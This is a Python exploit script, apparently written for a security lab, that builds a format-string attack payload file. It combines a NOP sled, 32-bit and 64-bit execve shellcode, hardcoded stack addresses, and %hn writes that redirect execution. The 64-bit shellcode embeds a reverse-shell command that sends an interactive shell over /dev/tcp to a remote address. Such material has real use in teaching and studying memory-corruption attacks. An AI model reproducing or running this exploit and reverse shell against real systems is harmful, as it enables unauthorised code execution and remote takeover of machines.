#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash "
   "-c "
   "/bin/ls -l; echo '===== Success! ======'                  *"
   # The * in this line serves as the position marker         *
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash "
   "-c "
   "pwd; /bin/sh -i > /dev/tcp/10.0.2.15/7070 0<&1 2>&1                  *"
   # The * in this line serves as the position marker         *
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_32

# Put the shellcode somewhere in the payload
start = N - len(shellcode)
content[start:start + len(shellcode)] = shellcode
############################################################
#
#Construct the format string here
number = 0xffffd378+6 # 0xffffd378 = frame pointer address
content[0:4] = (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8] = ("@@@@").encode('latin-1')
number = 0xffffd378 +4 # 0xffffd378 = frame pointer address
content[8:12] = (number).to_bytes(4,byteorder='little')


###########################################################################################################
## here 0xaabb is 0xffff = 65535                                                                         ##
## Note: Address for ur case might be something like 0xff8c, then 0xaabb = 0xff8c, its not always 0xffff ##
## 65535-4-4-4-8*62(length to buffer-2) - 1*62(length to buffer - 2) = 64965                             ##
## 0xccdd is the last 4 bytes of input buffer address in my case it was 0xd450                                 ##
## 0xd450+1+0x168=54713                                                                                  ##
###########################################################################################################

s = "%.8x."*62 + "%.64965x"+"%hn" + "%.54713x" +"%hn"

# The line shows how to store the string s at offset 8
fmt = (s).encode('latin-1')
print(len(fmt))
content[12:12+len(fmt)] = fmt

#
############################################################
# Save the format string to file
with open('badfile', 'wb') as f:
	f.write(content)